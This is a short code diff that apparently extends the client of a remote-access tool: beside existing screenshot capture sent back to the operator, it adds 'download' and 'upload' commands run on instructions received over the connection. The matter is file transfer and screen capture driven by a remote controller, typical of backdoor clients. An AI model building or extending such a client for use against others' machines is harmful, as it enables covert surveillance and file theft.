@@ -90,6 +90,18 @@ class CLIENT:
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
 
+        elif data[0] == "download":
+            
+            #print("Executing Download: " + data[1])
+            down = DOWNLOADER()
+            self.send_data(down.download(data[1], data[2]))
+
+        elif data[0] == "upload":
+            
+            #print("Executing Upload: " + data[1])
+            down = DOWNLOADER()
+            self.send_data(down.upload(data[1], data[2]))
+
     def acceptor(self):
         data = ""
         chunk = b""
